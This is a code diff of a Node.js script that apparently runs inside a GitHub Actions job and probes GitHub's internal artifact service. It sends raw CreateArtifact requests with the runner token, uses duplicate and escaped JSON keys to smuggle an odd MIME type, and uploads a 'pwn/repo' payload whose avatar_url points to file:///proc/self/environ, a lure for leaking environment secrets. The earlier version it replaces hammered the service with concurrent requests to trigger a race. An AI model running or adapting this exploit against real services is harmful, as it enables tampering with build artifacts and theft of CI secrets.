@@ -5,85 +5,105 @@ import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/inte
 import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
 
 const ids = getBackendIdsFromToken();
-const oddMime = 'application/json\u0085';
-const validMime = 'application/json';
-const payload = Buffer.from(JSON.stringify({
+const endpoint = new URL(
+  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
+  process.env.ACTIONS_RESULTS_URL,
+);
+const token = process.env.ACTIONS_RUNTIME_TOKEN;
+const weird = 'application/json\u0085';
+const body = Buffer.from(JSON.stringify({
   full_name: 'pwn/repo',
   owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-  description: 'Repo Cassette artifact race carrier',
+  description: 'Repo Cassette duplicate-field carrier',
   stargazers_count: 0,
 }));
-const digest = createHash('sha256').update(payload).digest('hex');
+const digest = createHash('sha256').update(body).digest('hex');
+const client = internalArtifactTwirpClient({maxAttempts: 1});
 
-function client() {
-  // Separate clients give concurrent creates independent socket pools.
-  return internalArtifactTwirpClient({maxAttempts: 1});
+function quoted(value) {
+  return JSON.stringify(value);
 }
 
-async function create(name, version) {
-  return client().CreateArtifact({
+async function rawCreate(name, fields) {
+  const raw = '{' +
+    '"workflow_run_backend_id":' + quoted(ids.workflowRunBackendId) + ',' +
+    '"workflow_job_run_backend_id":' + quoted(ids.workflowJobRunBackendId) + ',' +
+    '"name":' + quoted(name) + ',' + fields + '}';
+  const response = await fetch(endpoint, {
+    method: 'POST',
+    headers: {
+      authorization: `Bearer ${token}`,
+      'content-type': 'application/json',
+    },
+    body: raw,
+  });
+  const text = await response.text();
+  let result = {};
+  try { result = JSON.parse(text); } catch {}
+  return {
+    status: response.status,
+    text,
+    signedUploadUrl: result.signed_upload_url || result.signedUploadUrl || '',
+    ok: result.ok,
+  };
+}
+
+async function publish(name, signedUploadUrl) {
+  const blob = new BlobClient(signedUploadUrl).getBlockBlobClient();
+  await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: weird}});
+  const result = await client.FinalizeArtifact({
     workflowRunBackendId: ids.workflowRunBackendId,
     workflowJobRunBackendId: ids.workflowJobRunBackendId,
     name,
-    version,
-    mimeType: StringValue.create({
-      value: version === 6 ? oddMime : validMime,
-    }),
-  });
-}
-
-async function upload(url) {
-  await new BlobClient(url).getBlockBlobClient().uploadData(payload, {
-    blobHTTPHeaders: {blobContentType: oddMime},
-  });
-}
-
-async function finalize(name) {
-  return client().FinalizeArtifact({
-    workflowRunBackendId: ids.workflowRunBackendId,
-    workflowJobRunBackendId: ids.workflowJobRunBackendId,
-    name,
-    size: String(payload.length),
+    size: String(body.length),
     hash: StringValue.create({value: `sha256:${digest}`}),
   });
+  await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: weird}});
+  return String(result.artifactId);
 }
+
+const cases = [
+  ['control-v7', '"version":7,"mime_type":"application/json"'],
+  ['control-v6', `"version":6,"mime_type":${quoted(weird)}`],
+  ['mime-valid-weird',
+    `"version":7,"mime_type":"application/json","mime_type":${quoted(weird)}`],
+  ['mime-weird-valid',
+    `"version":7,"mime_type":${quoted(weird)},"mime_type":"application/json"`],
+  ['mime-snake-camel',
+    `"version":7,"mime_type":"application/json","mimeType":${quoted(weird)}`],
+  ['mime-camel-snake',
+    `"version":7,"mimeType":${quoted(weird)},"mime_type":"application/json"`],
+  ['version-seven-six',
+    `"version":7,"version":6,"mime_type":${quoted(weird)}`],
+  ['version-six-seven',
+    `"version":6,"version":7,"mime_type":${quoted(weird)}`],
+  ['escaped-key-valid-weird',
+    `"version":7,"mime_type":"application/json","mime_\\u0074ype":${quoted(weird)}`],
+  ['escaped-key-weird-valid',
+    `"version":7,"mime_\\u0074ype":${quoted(weird)},"mime_type":"application/json"`],
+];
 
 const report = [];
-for (let round = 0; round < 24; round += 1) {
-  const name = `cassette-storm-${process.env.GITHUB_RUN_ID}-${round}`;
-  const versions = Array.from({length: 32}, (_, index) =>
-    (index + round) % 2 === 0 ? 6 : 7);
-
-  const opened = await Promise.allSettled(versions.map(version => create(name, version)));
-  const handles = opened
-    .filter(item => item.status === 'fulfilled' && item.value?.signedUploadUrl)
-    .map(item => item.value.signedUploadUrl);
-  const urls = [...new Set(handles)];
-  await Promise.allSettled(urls.map(upload));
-
-  const sealed = await Promise.allSettled(
-    Array.from({length: 12}, () => finalize(name)),
-  );
-  const artifactIds = [...new Set(sealed
-    .filter(item => item.status === 'fulfilled' && item.value?.artifactId)
-    .map(item => String(item.value.artifactId)))];
-
-  await Promise.allSettled(urls.map(upload));
-  const extensions = urls.map(url => new URL(url).pathname.split('.').at(-1));
-  const result = {
-    round,
-    name,
-    fulfilledCreates: handles.length,
-    uniqueBlobs: urls.length,
-    zipBlobs: extensions.filter(x => x === 'zip').length,
-    jsonBlobs: extensions.filter(x => x === 'json').length,
-    artifactIds,
-  };
-  report.push(result);
-  console.log(`STORM ${JSON.stringify(result)}`);
+for (const [label, fields] of cases) {
+  const name = `wire-${process.env.GITHUB_RUN_ID}-${label}`;
+  try {
+    const created = await rawCreate(name, fields);
+    const item = {
+      label,
+      status: created.status,
+      ok: created.ok,
+      response: created.text.slice(0, 220),
+    };
+    if (created.signedUploadUrl) {
+      item.path = new URL(created.signedUploadUrl).pathname.split('.').at(-1);
+      item.artifactId = await publish(name, created.signedUploadUrl);
+    }
+    report.push(item);
+    console.log(`WIRE ${JSON.stringify(item)}`);
+  } catch (error) {
+    const item = {label, error: String(error).slice(0, 300)};
+    report.push(item);
+    console.log(`WIRE ${JSON.stringify(item)}`);
+  }
 }
-
-if (!report.some(item => item.artifactIds.length)) {
-  throw new Error('No storm artifact was finalized');
-}
-console.log(`MANIFEST ${JSON.stringify(report)}`);
+console.log(`WIRE_REPORT ${JSON.stringify(report)}`);
